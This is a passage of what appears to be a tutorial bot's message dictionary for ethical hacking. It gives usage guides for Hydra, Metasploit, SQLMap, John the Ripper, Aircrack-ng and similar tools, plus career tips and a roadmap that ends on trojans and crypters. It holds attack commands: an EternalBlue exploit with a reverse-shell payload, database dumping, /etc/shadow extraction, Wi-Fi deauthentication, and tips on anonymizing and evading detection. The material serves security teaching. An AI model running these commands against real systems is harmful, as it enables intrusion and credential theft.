            "- Always check for rate limiting or CAPTCHA on web logins\n"
            "- Combine with `nmap` to detect open ports/services before launching attack\n"
            "- Use proxychains to anonymize (e.g., via Tor)\n"
            "`proxychains hydra -L users.txt -P pass.txt ssh://target`\n\n"

            "🚨 *Ethical Notice:*\n"
            "Only use Hydra on systems you *own* or are *authorized* to test.\n"
            "Unauthorized attacks are *illegal and unethical*.\n\n"

            "🏁 *Conclusion:*\n"
            "Hydra is a versatile and effective tool for brute-force login testing across many services. With proper targeting and lists, it’s a core tool in every ethical hacker’s arsenal.\n"
            "_If there's a login, Hydra can try to break in — ethically._ 🔐🧠",

    "burpsuite": "*🧪 Burp Suite* – Web Application Security Testing Tool\n\n"
                "🧠 *What is Burp Suite?*\n"
                "Burp Suite is a powerful web vulnerability scanner and proxy tool used by ethical hackers to test and exploit web applications. It allows interception, manipulation, scanning, and exploitation of HTTP/S traffic.\n\n"

                "🛠 *Installation:*\n"
                "\"- Kali Linux: Pre-installed\"\n"
                "\"- Debian/Ubuntu: `sudo apt install burpsuite`\"\n"
                "\"- Windows/macOS: Download from https://portswigger.net/burp\"\n\n"

                "🌐 *How Burp Works:*\n"
                "\"- Acts as a proxy between your browser and target site\"\n"
                "\"- Intercepts and modifies HTTP/S requests and responses\"\n"
                "\"- Analyzes and exploits vulnerabilities like XSS, SQLi, CSRF, etc.\"\n\n"

                "🧩 *Key Components:*\n"
                "\"- Proxy: Intercept web traffic\"\n"
                "\"- Repeater: Modify and resend requests\"\n"
                "\"- Intruder: Automate attacks like brute force\"\n"
                "\"- Scanner (Pro): Automatically find vulnerabilities\"\n"
                "\"- Decoder: Encode/decode data (Base64, URL, Hex)\"\n"
                "\"- Comparer: Compare two requests/responses\"\n"
                "\"- Extender: Add extensions to increase power\"\n\n"

                "🔧 *Setup Burp Proxy:*\n"
                "\"- Open Burp → Proxy tab → Intercept → On\"\n"
                "\"- Set browser proxy to 127.0.0.1:8080\"\n"
                "\"- Import Burp CA certificate to browser for HTTPS\"\n\n"

                "🛠️ *Basic Usage Workflow:*\n"
                "\"1. Configure browser to use Burp proxy\"\n"
                "\"2. Browse the target application\"\n"
                "\"3. Intercept and inspect traffic in 'Proxy' tab\"\n"
                "\"4. Send requests to 'Repeater' or 'Intruder'\"\n"
                "\"5. Modify, replay, brute-force, or scan requests\"\n\n"

                "🎯 *Use Cases for Hackers:*\n"
                "\"- Bypass client-side validations\"\n"
                "\"- Find SQL Injection points manually\"\n"
                "\"- Exploit XSS vulnerabilities\"\n"
                "\"- Fuzz parameters using Intruder\"\n"
                "\"- Capture and reuse session tokens\"\n\n"

                "📚 *Practical Tasks:*\n"
                "✅ Intercept and modify a login POST request\n"
                "✅ Change a product price in a cart request\n"
                "✅ Perform brute force using Intruder with wordlist\n"
                "✅ Replay a CSRF request using Repeater\n"
                "✅ Analyze cookies and headers for security flaws\n\n"

                "💡 *Pro Tips:*\n"
                "\"- Use Repeater to understand backend responses\"\n"
                "\"- Use extensions like 'AuthMatrix', 'Logger++', 'Turbo Intruder'\"\n"
                "\"- Combine with browser plugins like FoxyProxy\"\n"
                "\"- Use Burp Collaborator to detect blind vulnerabilities\"\n\n"

                "🚨 *Legal Note:*\n"
                "Only test applications that you own or are authorized to assess.\n"
                "Unauthorized scanning and interception is illegal.\n\n"

                "🏁 *Conclusion:*\n"
                "Burp Suite is the ultimate toolkit for web app pentesting. Master it and you'll uncover what web developers hide.\n"
                "_Inspect. Intercept. Exploit – the ethical way._ 🕵️‍♂️🌐",

    "metasploit": "*📦 Metasploit* – The Ultimate Exploitation Framework\n\n"
                "🧠 *What is Metasploit?*\n"
                "Metasploit is a powerful exploitation and post-exploitation framework used by ethical hackers to identify, exploit, and validate vulnerabilities.\n"
                "It includes payload generators, exploit modules, scanners, listeners, and more.\n\n"

                "🛠 *Installation:*\n"
                "\"- Kali Linux: Pre-installed\"\n"
                "\"- Ubuntu/Debian: `sudo apt install metasploit-framework`\"\n"
                "\"- Windows/macOS: https://www.metasploit.com/\"\n\n"

                "🚀 *Start Metasploit:*\n"
                "`msfconsole`\n"
                "Wait for it to load the modules.\n\n"

                "🔍 *Basic Workflow:*\n"
                "\"1. Find a target vulnerability\"\n"
                "\"2. Select an exploit module\"\n"
                "\"3. Set the payload (e.g., reverse shell)\"\n"
                "\"4. Configure options (RHOST, LHOST, PORT, etc.)\"\n"
                "\"5. Launch the exploit\"\n\n"

                "⚙️ *Example Attack:*\n"
                "`use exploit/windows/smb/ms17_010_eternalblue`\n"
                "`set RHOST 192.168.1.105`\n"
                "`set PAYLOAD windows/x64/meterpreter/reverse_tcp`\n"
                "`set LHOST 192.168.1.10`\n"
                "`exploit`\n\n"

                "🧰 *Popular Modules:*\n"
                "\"- scanners/portscan/tcp\"\n"
                "\"- exploit/multi/handler\"\n"
                "\"- auxiliary/gather/search_email_collector\"\n"
                "\"- post/multi/recon/local_exploit_suggester\"\n\n"

                "📞 *Meterpreter Tips:*\n"
                "\"- `sysinfo`, `getuid`, `shell`\"\n"
                "\"- `screenshot`, `webcam_snap`, `keyscan_start`\"\n"
                "\"- `download`, `upload`, `hashdump`\"\n"
                "\"- `persistence`, `migrate`, `record_mic`\"\n\n"

                "💡 *Pro Tips:*\n"
                "\"- Use `search <term>` to find modules\"\n"
                "\"- Use `info` to see module options\"\n"
                "\"- Use `check` before `exploit` to verify vulnerability\"\n\n"

                "⚠️ *Legal Warning:*\n"
                "Only exploit systems you own or are authorized to test. Unauthorized use of Metasploit is illegal.\n\n"

                "🏁 *Conclusion:*\n"
                "Metasploit is the Swiss Army knife for hackers. Mastering it means mastering exploitation.\n"
                "_Launch payloads, hack ethically._ ⚔️💻",

    "nikto": "*🛡️ Nikto* – Web Server Vulnerability Scanner\n\n"
            "🧠 *What is Nikto?*\n"
            "Nikto is a fast, open-source web server scanner that detects outdated software, security misconfigurations, and vulnerabilities in websites.\n\n"

            "🛠 *Installation:*\n"
            "\"- Kali Linux: Pre-installed\"\n"
            "\"- Ubuntu/Debian: `sudo apt install nikto`\"\n"
            "\"- GitHub: `git clone https://github.com/sullo/nikto.git`\"\n"
            "\"  Run with: `perl nikto.pl -h <host>`\"\n\n"

            "⚙️ *Basic Usage:*\n"
            "`nikto -h http://target.com`\n"
            "`nikto -h 192.168.1.10 -p 8080`\n\n"

            "🎯 *Common Options:*\n"
            "\"- `-h` → Target host\"\n"
            "\"- `-p` → Port number\"\n"
            "\"- `-Tuning` → Specific tests (e.g., XSS, files, injection)\"\n"
            "\"- `-o` → Output to file\"\n"
            "\"- `-ssl` → Force SSL scan\"\n\n"

            "🧪 *Examples:*\n"
            "- Scan for HTTP issues:\n"
            "`nikto -h http://192.168.1.100`\n"
            "- Output report to file:\n"
            "`nikto -h target.com -o scan.txt -Format txt`\n"
            "- Scan HTTPS site:\n"
            "`nikto -h https://secure.site`\n\n"

            "📚 *Finds Issues Like:*\n"
            "\"- Outdated Apache, PHP, IIS versions\"\n"
            "\"- Dangerous files (e.g., admin.php, test.php)\"\n"
            "\"- XSS, SQL error messages, headers issues\"\n"
            "\"- Default credentials, backup files, open directories\"\n\n"

            "💡 *Pro Tips:*\n"
            "\"- Combine with `Burp` for deep testing\"\n"
            "\"- Run behind `proxychains` to anonymize\"\n"
            "\"- Use `-Tuning 123` to focus on injection, XSS, interesting files\"\n\n"

            "⚠️ *Legal Reminder:*\n"
            "Scan only web apps you own or have written permission to test. Scanning others without consent is illegal.\n\n"

            "🏁 *Conclusion:*\n"
            "Nikto is a lightweight but powerful web scanner every ethical hacker should use for quick checks.\n"
            "_Fast, noisy, effective. Scan wisely._ 🌐🔍",

    "sqlmap": "*🕷️ SQLMap* – Automated SQL Injection Tool\n\n"
            "🧠 *What is SQLMap?*\n"
            "SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web apps.\n\n"

            "🛠 *Installation:*\n"
            "\"- Kali Linux: Pre-installed\"\n"
            "\"- GitHub: `git clone https://github.com/sqlmapproject/sqlmap.git`\"\n"
            "\"  Run with: `python3 sqlmap.py`\"\n\n"

            "⚙️ *Basic Usage:*\n"
            "`sqlmap -u \"http://target.com/page.php?id=1\" --batch`\n"
            "Use `--batch` to run without prompts.\n\n"

            "🎯 *Common Options:*\n"
            "\"- `--dbs` → List databases\"\n"
            "\"- `--tables -D <db>` → Show tables in a DB\"\n"
            "\"- `--columns -T <table> -D <db>` → Show columns\"\n"
            "\"- `--dump` → Dump data from a table\"\n"
            "\"- `--os-shell` → Get OS command shell\"\n"
            "\"- `--risk=3 --level=5` → Deep scanning\"\n\n"

            "🧪 *Example Attacks:*\n"
            "- List databases:\n"
            "`sqlmap -u \"http://site.com/item.php?id=2\" --dbs`\n"
            "- Dump users from DB:\n"
            "`sqlmap -u \"http://site.com/p.php?id=2\" -D testdb -T users --dump`\n"
            "- Get SQL shell:\n"
            "`sqlmap -u \"http://vuln.com/x?id=1\" --sql-shell`\n\n"

            "💡 *Advanced Tips:*\n"
            "\"- Use `--random-agent` to avoid detection\"\n"
            "\"- Test cookies with: `--cookie=\"PHPSESSID=xyz\"`\"\n"
            "\"- Use `-p` to target specific parameter\"\n"
            "\"- Use `--tor --check-tor` to anonymize via Tor\"\n\n"

            "📁 *Practical Tasks:*\n"
            "✅ Find SQLi in DVWA or bWAPP\n"
            "✅ Dump users table from test site\n"
            "✅ Try `--os-shell` on vulnerable test app\n\n"

            "⚠️ *Ethical Note:*\n"
            "Only target applications that you have permission to test. Misuse can result in legal consequences.\n\n"

            "🏁 *Conclusion:*\n"
            "SQLMap automates powerful SQL injection attacks and database extraction. Use it wisely, ethically, and legally.\n"
            "_Inject smart. Extract carefully._ 🧠🕳️",

    "john": "*🔧 John the Ripper* – Password Cracking Tool\n\n"
            "🧠 *What is John the Ripper?*\n"
            "John the Ripper (JtR) is an open-source, fast, and powerful password-cracking tool.\n"
            "It supports various hash types (MD5, SHA1, NTLM, etc.) and cracks passwords using dictionary, brute-force, and rule-based attacks.\n\n"

            "🛠 *Installation:*\n"
            "*Debian/Ubuntu:*\n"
            "`sudo apt update && sudo apt install john`\n"
            "*Kali Linux:* Pre-installed\n"
            "*macOS (via Homebrew):*\n"
            "`brew install john-jumbo`\n\n"

            "📦 *Supported Hash Types:*\n"
            "- Unix (/etc/shadow)\n"
            "- Windows LM/NTLM hashes\n"
            "- MD5, SHA1, SHA256, bcrypt, etc.\n"
            "- ZIP/RAR/Office files (with jumbo version)\n\n"

            "🔍 *Basic Usage:*\n"
            "1. Prepare a hash file\n"
            "2. Run John with a wordlist\n"
            "`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`\n"
            "3. View cracked passwords:\n"
            "`john --show hashes.txt`\n\n"

            "🧪 *Extracting Hashes:*\n"
            "- *Linux:* `/etc/shadow` (needs root)\n"
            "`unshadow /etc/passwd /etc/shadow > hashes.txt`\n"
            "- *Windows (SAM/NTLM):* Use `samdump2` or `impacket-secretsdump`\n\n"

            "🎯 *Modes of Cracking:*\n"
            "- *Wordlist (dictionary):*\n"
            "`john --wordlist=rockyou.txt hashes.txt`\n"
            "- *Incremental (brute-force):*\n"
            "`john --incremental hashes.txt`\n"
            "- *Single Mode:* Fastest, uses usernames for guesses\n"
            "`john --single hashes.txt`\n"
            "- *Mask Mode:* Targeted brute-force (e.g., 6-digit pins)\n"
            "`john --mask='?d?d?d?d?d?d' hashes.txt`\n\n"

            "⚙️ *Hash Identification:*\n"
            "Use *`hashid`* or *`hash-identifier`* tools to detect hash type\n"
            "`hashid <hash>`\n\n"

            "🛡️ *Example Hash Formats:*\n"
            "- *MD5:* `5f4dcc3b5aa765d61d8327deb882cf99`\n"
            "- *SHA1:* `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`\n"
            "- *NTLM:* `32ed87bdb5fdc5e9cba88547376818d4`\n\n"

            "📚 *Real-World Scenarios:*\n"
            "1. Crack user passwords from leaked databases\n"
            "2. Crack WPA handshake hashes (converted to JtR format)\n"
            "3. Penetration testing post-exploitation (dump and crack)\n"
            "4. Reverse engineering app password protection\n\n"

            "🎓 *Learn by Doing – Practice Tasks:*\n"
            "✅ Task 1: Crack a basic MD5 hash using rockyou.txt\n"
            "✅ Task 2: Create a custom wordlist and crack your own hash\n"
            "✅ Task 3: Use mask mode to brute-force a 6-digit PIN hash\n"
            "✅ Task 4: Crack a SAM file dump using NTLM hashes\n"
            "✅ Task 5: Try a hybrid attack using rules\n\n"

            "🧠 *Advanced Usage:*\n"
            "- *Custom Rule-Based Cracking:*\n"
            "`john --rules --wordlist=rockyou.txt hashes.txt`\n"
            "- *Restore interrupted session:*\n"
            "`john --restore`\n"
            "- *Save session:*\n"
            "`john --session=myattack --wordlist=rockyou.txt hashes.txt`\n\n"

            "🔐 *Cracked Passwords Location:*\n"
            "`~/.john/john.pot`\n"
            "Use `john --show hashes.txt` to read it\n\n"

            "📂 *Convert Hashes (if needed):*\n"
            "Use `tools/` in Jumbo John build:\n"
            "`zip2john`, `rar2john`, `pdf2john`, `office2john`\n"
            "Example:\n"
            "`zip2john secret.zip > zip.hash`\n"
            "`john --wordlist=rockyou.txt zip.hash`\n\n"

            "🚨 *Ethical Note:*\n"
            "Only crack hashes in legal, educational, or authorized pentest environments.\n"
            "Unauthorized cracking is illegal and unethical.\n\n"

            "🏁 *Conclusion:*\n"
            "John the Ripper is a go-to tool for any ethical hacker or pentester needing to test password strength or crack hashes.\n"
            "_Mastering JtR means mastering password security._ 🔐🔥",

    "mobsf": "*📱 MobSF (Mobile Security Framework)* – Android/iOS App Analyzer\n\n"
            "🧠 *What is MobSF?*\n"
            "MobSF is an automated tool for performing static and dynamic analysis of Android/iOS mobile apps.\n"
            "It helps in identifying vulnerabilities, exposed components, hardcoded secrets, and more.\n\n"

            "🛠 *Installation (Linux):*\n"
            "`sudo apt update && sudo apt install git python3 python3-pip`\n"
            "`git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git`\n"
            "`cd Mobile-Security-Framework-MobSF`\n"
            "`./setup.sh`  or `python3 manage.py runserver`\n\n"

            "🌐 *Access Interface:*\n"
            "After starting server → Open in browser:\n"
            "`http://127.0.0.1:8000`\n\n"

            "📦 *Supported Files:*\n"
            "- `.apk` → Android\n"
            "- `.ipa` → iOS\n"
            "- `.zip` source folders\n\n"

            "🔍 *Static Analysis Features:*\n"
            "- Permissions and manifest analysis\n"
            "- API calls, code review, hardcoded secrets\n"
            "- Malware signatures, insecure components\n\n"

            "🚀 *Dynamic Analysis (Android):*\n"
            "- Uses MobSF Android emulator or your device\n"
            "- Analyze runtime behavior, network calls, dynamic API traces\n"
            "Upload APK and click *Dynamic Analyzer*\n\n"

            "🛡️ *Security Checks:*\n"
            "- WebView exposure\n"
            "- Debuggable apps\n"
            "- Broken cryptography\n"
            "- Insecure storage\n"
            "- Hardcoded API keys and credentials\n\n"

            "📁 *Reports Output:*\n"
            "- HTML or PDF reports generated automatically\n"
            "- Can be exported and saved\n\n"

            "🧪 *Use Case for Hackers:*\n"
            "- Reverse engineering APKs before exploiting\n"
            "- Auditing third-party apps\n"
            "- Malware detection in Android/iOS packages\n\n"

            "🎓 *Practice Tasks:*\n"
            "✅ Upload a known APK like WhatsApp clone\n"
            "✅ Check if it's debuggable or has exposed components\n"
            "✅ Try decompiling an APK with MobSF and locate strings\n"
            "✅ Enable dynamic analysis and inspect API traffic\n\n"

            "🧠 *Pro Tips:*\n"
            "- Use with Genymotion or emulator for better dynamic analysis\n"
            "- Check MobSF logs for deeper insights\n"
            "- Automate using MobSF REST API\n\n"

            "🚨 *Note:*\n"
            "Only analyze apps you own or have permission to audit. Reverse engineering others' APKs without consent may be illegal.\n\n"

            "🏁 *Conclusion:*\n"
            "MobSF is a must-have mobile analysis tool for ethical hackers, bug bounty hunters, and malware researchers.\n"
            "_Secure the app before the attacker breaks it!_ 🛡️📱",

"apk_hacking": "*APK Debugging & Mobile App Hacking*\n\n"
    "Mobile applications are a huge attack surface. Today you'll learn how to decompile, analyze, and modify Android APKs.\n\n"

    "*🧠 Topics Covered:*\n"
    "- APK structure & AndroidManifest.xml\n"
    "- Reverse Engineering APKs\n"
    "- Tools: `apktool`, `jadx`, `MobSF`\n"
    "- Modifying & Recompiling APKs\n"
    "- Basic Smali code intro\n\n"

    "*🛠️ Practical Tasks:*\n"
    "1. Decompile an APK with apktool:\n"
    "   ```bash\n"
    "   apktool d app.apk\n"
    "   ```\n"
    "2. View source code with JADX-GUI\n"
    "3. Modify strings/permissions and rebuild APK:\n"
    "   ```bash\n"
    "   apktool b app -o new.apk\n"
    "   ```\n"
    "4. Sign APK using `jarsigner` or `apksigner`\n"
    "5. Run static analysis with MobSF\n\n"

    "*🎥 Suggested Videos:*\n"
    "- [APK Reverse Engineering Tutorial](https://youtu.be/kE6V2Of3wqI)\n"
    "- [Using MobSF for Android Pentesting](https://youtu.be/y8FEAdxHFFU)\n\n"

    "*📁 Bonus Tools:*\n"
    "- `dex2jar`, `jd-gui` (Java class conversion)\n"
    "- `Frida` and `Objection` for dynamic analysis\n"
    "- Emulators: `AVD`, `Genymotion`, or `BlueStacks`\n\n"

    "*✅ Outcome:*\n"
    "- Able to reverse engineer and modify Android APKs\n"
    "- Understand how to debug, analyze, and tamper with mobile apps\n"
    "- Familiar with Android pentesting tools and static/dynamic analysis\n",

"ghidra": "*🧰 Ghidra* – Reverse Engineering & Malware Analysis Tool\n\n"
        "🧠 *What is Ghidra?*\n"
        "Ghidra is a powerful reverse engineering framework developed by the NSA.\n"
        "It's used to analyze compiled programs (binaries) and detect hidden behavior, malware, and vulnerabilities.\n\n"

        "🛠 *Installation:*\n"
        "1. Download from:\n"
        "[https://ghidra-sre.org](https://ghidra-sre.org)\n"
        "2. Extract the archive\n"
        "3. Run:\n"
        "`./ghidraRun` (Linux/macOS)\n"
        "or\n"
        "`ghidraRun.bat` (Windows)\n\n"

        "📦 *Supported File Types:*\n"
        "- `.exe`, `.bin`, `.elf`, `.so`, `.dll`, `.apk`, firmware dumps\n"
        "- x86, ARM, MIPS, PowerPC architectures\n\n"

        "🔍 *Core Features:*\n"
        "- Disassembler\n"
        "- Decompiler (convert assembly to C-like code)\n"
        "- Binary analysis\n"
        "- Patch editor\n"
        "- Symbolic analysis and graph views\n\n"

        "⚙️ *Workflow Overview:*\n"
        "1. Start Ghidra → Create a project\n"
        "2. Import a binary\n"
        "3. Analyze with default options\n"
        "4. Explore Decompiled Code\n"
        "5. Navigate functions, strings, symbols\n\n"

        "🔐 *Reverse Engineering Tasks:*\n"
        "- Identify malware behavior\n"
        "- Find hardcoded credentials\n"
        "- Analyze control flow and function logic\n"
        "- Patch binary logic\n"
        "- Study obfuscation & encryption routines\n\n"

        "🎯 *Use Cases:*\n"
        "- Malware reverse engineering\n"
        "- Exploit development\n"
        "- CTF/Forensics challenges\n"
        "- Security research\n\n"

        "🎓 *Practice Tasks:*\n"
        "✅ Import a simple C-compiled binary and inspect the `main()`\n"
        "✅ Use `Search → Strings` to locate hints\n"
        "✅ Follow assembly flow using decompiler\n"
        "✅ Modify hex data or patch functions\n"
        "✅ Try analyzing a crackme file (from crackmes.one)\n\n"

        "🧠 *Advanced Tips:*\n"
        "- Use bookmarks to mark functions\n"
        "- Rename variables for easier tracking\n"
        "- Use *Function Graph View* for control flow analysis\n"
        "- Integrate Python scripts for automation\n\n"

        "📁 *Export Features:*\n"
        "- Export decompiled code\n"
        "- Save custom reports\n"
        "- Create binary patches\n\n"

        "🚨 *Ethical Warning:*\n"
        "Ghidra is for RESEARCH & LEGAL use only. Use it only on binaries you’re authorized to analyze.\n\n"

        "🏁 *Conclusion:*\n"
        "Ghidra is a world-class reverse engineering suite for dissecting and understanding binaries. With powerful analysis tools, it rivals commercial RE tools like IDA Pro.\n"
        "_Reverse like a pro with Ghidra!_ 🧠💻",

    "aircrackng": "*📡 Aircrack-ng* – Wi-Fi Cracking & Wireless Security Suite\n\n"
        "🧠 *What is Aircrack-ng?*\n"
        "Aircrack-ng is a complete suite of tools to assess Wi-Fi network security.\n"
        "It allows packet capturing, deauthentication, handshake capture, and cracking WEP/WPA/WPA2 keys.\n\n"

        "🛠 *Installation:*\n"
        "*Kali Linux:* Pre-installed\n"
        "*Ubuntu/Debian:*\n"
        "`sudo apt update && sudo apt install aircrack-ng`\n"
        "*macOS (via Homebrew):*\n"
        "`brew install aircrack-ng`\n\n"

        "📦 *Tools Included:*\n"
        "- `airmon-ng`: Enables monitor mode\n"
        "- `airodump-ng`: Captures packets & handshakes\n"
        "- `aireplay-ng`: Injects/deauths packets\n"
        "- `aircrack-ng`: Cracks captured handshakes\n\n"

        "📡 *Monitor Mode Setup:*\n"
        "Enable monitor mode on your Wi-Fi card:\n"
        "`sudo airmon-ng check kill`\n"
        "`sudo airmon-ng start wlan0`\n"
        "Interface changes to `wlan0mon`\n\n"

        "🔍 *Capture Handshake:*\n"
        "1. Run airodump-ng:\n"
        "`sudo airodump-ng wlan0mon`\n"
        "2. Note target BSSID and channel (CH)\n"
        "3. Capture handshake:\n"
        "`sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon`\n"
        "4. Deauthenticate client:\n"
        "`sudo aireplay-ng -0 10 -a <BSSID> wlan0mon`\n\n"

        "💥 *Crack the Handshake:*\n"
        "`aircrack-ng -w rockyou.txt capture.cap`\n"
        "Requires handshake in `.cap` file and a good wordlist\n\n"

        "🎯 *Wordlists for Cracking:*\n"
        "- `/usr/share/wordlists/rockyou.txt`\n"
        "- Use `crunch`, `cewl`, or `cupp` to create custom wordlists\n\n"

        "🔐 *WEP Cracking (Old networks):*\n"
        "1. Capture IV packets using airodump-ng\n"
        "2. Use aireplay-ng to inject packets:\n"
        "`aireplay-ng -3 -b <BSSID> wlan0mon`\n"
        "3. Crack with:\n"
        "`aircrack-ng wep.cap`\n\n"

        "📚 *Real-World Practice:*\n"
        "✅ Practice on your own router or with tools like *Wi-Fi Pumpkin*, *Fluxion*, or a test lab.\n"
        "✅ Use `wifite` to automate the process\n"
        "✅ Analyze captured packets with Wireshark\n\n"

        "🧠 *Pro Tips:*\n"
        "- Use a compatible Wi-Fi adapter that supports monitor mode and injection (e.g., Alfa AWUS036NHA)\n"
        "- Place antenna close to the target for better signal\n"
        "- Use channel locking in airodump-ng to avoid missing handshake\n\n"

        "⚠️ *Legal Warning:*\n"
        "Never use Aircrack-ng on networks you don't own or have permission to test. Unauthorized access is illegal and unethical.\n\n"

        "🏁 *Conclusion:*\n"
        "Aircrack-ng is a powerful wireless auditing toolset used by ethical hackers to test Wi-Fi security. Mastering it gives you deep insights into wireless networks and their weaknesses.\n"
        "_Capture the handshake, crack the code!_ 📶🔓",

    "career": "*📈 Career & Certifications:*\n\nChoose a sub-topic below to explore your future in ethical hacking:",

    "why_career": "*Why Choose Ethical Hacking?*\n\nEthical hacking is a high-demand skill in the cybersecurity industry. With increasing cyber threats, companies actively hire professionals to secure systems, detect vulnerabilities, and prevent data breaches.\n\nBenefits:\n- High salary potential\n- Job satisfaction from solving critical problems\n- Global career opportunities\n- Continuous learning and challenge",

    "certs": "*Top Ethical Hacking Certifications:*\n\n1. CEH (Certified Ethical Hacker)\n2. OSCP (Offensive Security Certified Professional)\n3. CompTIA Security+\n4. CISSP (Certified Information Systems Security Professional)\n5. eJPT (eLearnSecurity Junior Penetration Tester)\n6. GPEN (GIAC Penetration Tester)\n\nThese validate your skills in ethical hacking, penetration testing, and network defense.",

    "roadmap": "*Roadmap to Become an Ethical Hacker:*\n\n1. Learn networking basics (TCP/IP, ports, protocols)\n2. Get comfortable with Linux & terminal\n3. Understand cybersecurity concepts\n4. Learn programming (Python recommended)\n5. Study tools like Nmap, Wireshark, Metasploit\n6. Practice on platforms like Hack The Box, TryHackMe\n7. Get certified (e.g., CEH, OSCP)\n8. Start freelancing or apply for entry-level security roles",

    "jobs": "*Job Roles & Salaries:*\n\n- 🔍 Penetration Tester: ₹6–20 LPA\n- 🔐 Security Analyst: ₹5–15 LPA\n- 🧠 Security Consultant: ₹8–25 LPA\n- 🕵️ Ethical Hacker: ₹5–18 LPA\n- 👨‍💻 Security Researcher: ₹6–22 LPA\n\nSalaries vary by skill level, certifications, and experience. Freelance ethical hackers can also earn through bug bounty programs (e.g., HackerOne, Bugcrowd).",

    "career_tips": "*Career Tips & Resources:*\n\n- Stay updated with sites like Hacker News, Cybrary, and Exploit-DB\n- Practice on labs: TryHackMe, Hack The Box, PortSwigger Labs\n- Build a portfolio (GitHub, LinkedIn)\n- Contribute to open source security tools\n- Network with professionals via conferences & Discord communities\n- Keep learning—cybersecurity evolves fast!",

"ethical_hacking_roadmap": "*🧠 Complete 88-Day Ethical Hacking Roadmap*\n\n"
    "This roadmap builds you from a beginner hacker to an advanced red team operator. It’s structured week-by-week, covering everything from recon to malware analysis. Each section includes practical exercises, tools, and real-world attacks.\n\n"

    "*📅 Week 1: Fundamentals & Setup*\n"
    "- Day 1: Intro to Ethical Hacking & Lab Setup\n"
    "- Day 2: Networking Essentials for Hackers\n"
    "- Day 3: Linux Basics for Hackers\n"
    "- Day 4: Bash Scripting & Automation\n"
    "- Day 5: Footprinting and Reconnaissance\n"
    "- Day 6: Scanning & Enumeration\n"
    "- Day 7: Vulnerability Scanning\n\n"

    "*💥 Week 2: Exploitation Core*\n"
    "- Day 8: Exploitation Basics with Metasploit\n"
    "- Day 9: Exploiting Web Apps - SQL Injection\n"
    "- Day 10: Cross-Site Scripting (XSS)\n"
    "- Day 11: File Inclusion (LFI/RFI)\n"
    "- Day 12: Command Injection & RCE\n"
    "- Day 13: Privilege Escalation Basics\n"
    "- Day 14: Password Cracking Techniques\n\n"

    "*📡 Week 3: Wireless, Shells & Post-Exploitation*\n"
    "- Day 15: Wireless Hacking Basics (WiFi)\n"
    "- Day 16: Reverse Shells\n"
    "- Day 17: Post Exploitation Techniques\n"
    "- Day 18: Web Shells & PHP Exploits\n"
    "- Day 19: Client-Side Attacks & Social Engineering\n"
    "- Day 20: Malware Basics & Payloads\n"
    "- Day 21: Windows Hacking Techniques\n\n"

    "*🔐 Week 4: Advanced Skills & Real-World Practice*\n"
    "- Day 22: Linux Privilege Escalation\n"
    "- Day 23: Web App Hacking - XSS, CSRF, IDOR\n"
    "- Day 24: Cryptography Basics\n"
    "- Day 25: Bug Bounty 101\n"
    "- Day 26: Vulnerability Scanning & Reporting\n"
    "- Day 27: Malware Analysis Basics\n"
    "- Day 28: Red Team vs Blue Team\n"
    "- Day 29: Full Hack Simulation\n"
    "- Day 30: Graduation & Next Steps\n\n"

    "*🎮 Week 5: Game Hacking*\n"
    "- Day 33: Cheat Engine Basics\n"
    "- Day 34: Game Guardian for Android\n"
    "- Day 35: Unity Game Modding\n"
    "- Day 36: IDA/Ghidra for Game Reverse Engineering\n"
    "- Day 37: Frida Patching Techniques\n"
    "- Day 38: Trainer Creation Basics\n"
    "- Day 39: Ethics, Detection & Anti-Cheat\n\n"

    "*📱 Week 6: Mobile Hacking*\n"
    "- Day 40: Android Internals & Lab Setup\n"
    "- Day 41: Static APK Analysis\n"
    "- Day 42: Dynamic Analysis with Frida\n"
    "- Day 43: APK Reversing & Modding\n"
    "- Day 44: Bypassing Root & SSL Pinning\n"
    "- Day 45: MobSF & Burp Interception\n"
    "- Day 46: Advanced Attacks & Disclosure\n\n"

    "*🌐 Week 7: Website Hacking*\n"
    "- Day 47: Web Hacking Basics & Surface Mapping\n"
    "- Day 48: HTML/JS Recon & Source Mining\n"
    "- Day 49: Authentication Bypass Techniques\n"
    "- Day 50: SQL Injection Deep Dive\n"
    "- Day 51: Cross-Site Scripting (XSS) & DOM Cloning\n"
    "- Day 52: CSRF, Clickjacking & UI Redress Attacks\n"
    "- Day 53: IDOR & Business Logic Bypass\n"
    "- Day 54: Web CTF Practice Labs\n\n"

    "*📶 Week 8: Wireless & Bluetooth Hacking*\n"
    "- Day 55: WiFi Modes & Monitor Setup\n"
    "- Day 56: WPA Handshake Cracking with Aircrack-ng\n"
    "- Day 57: Evil Twin Attack with Rogue APs\n"
    "- Day 58: Bluetooth Protocols & Tools\n"
    "- Day 59: Scanning & Sniffing BLE Devices\n"
    "- Day 60: Exploiting Bluetooth with Payloads\n\n"

    "*🚩 Week 9: Red Teaming Essentials*\n"
    "- Day 61: CrackMapExec & Active Directory Recon\n"
    "- Day 62: Lateral Movement & Pass-the-Hash\n"
    "- Day 63: Crafting Custom Payloads\n"
    "- Day 64: Evasion of Antivirus & EDR Systems\n"
    "- Day 65: Initial Access (Phishing, Macros, etc.)\n"
    "- Day 66: C2 Channels & Maintaining Access\n"
    "- Day 67: Full Red Team Op with Detection Tactics\n\n"

    "*🧠 Week 10: Advanced Web Hacking*\n"
    "- Day 68: Advanced SQLi & WAF Bypass\n"
    "- Day 69: SSRF & Metadata Service Exploits\n"
    "- Day 70: XXE - XML External Entity Attacks\n"
    "- Day 71: Command Injection & RCE\n"
    "- Day 72: SSTI & Template Injection\n"
    "- Day 73: Subdomain Takeover + DNS Tricks\n"
    "- Day 74: Burp Suite Extensions & Automation\n\n"

    "*🔍 Week 11: Mobile Reverse Engineering*\n"
    "- Day 75: APK Structure & Tooling\n"
    "- Day 76: Decompiled Static Analysis with JADX\n"
    "- Day 77: Smali Code Walkthroughs & Tracing\n"
    "- Day 78: Frida + Objection Runtime Hooking\n"
    "- Day 79: SSL Pinning & Root Detection Bypass\n"
    "- Day 80: Frida Hooks in Native Functions\n"
    "- Day 81: Full Mobile App Exploit & Report\n\n"

    "*🦠 Week 12: Malware Development & Analysis*\n"
    "- Day 82: Types of Malware & Lab Setup\n"
    "- Day 83: Building Payloads with msfvenom\n"
    "- Day 84: Writing Custom Trojans in Python\n"
    "- Day 85: Obfuscation, Encryption & Crypters\n"
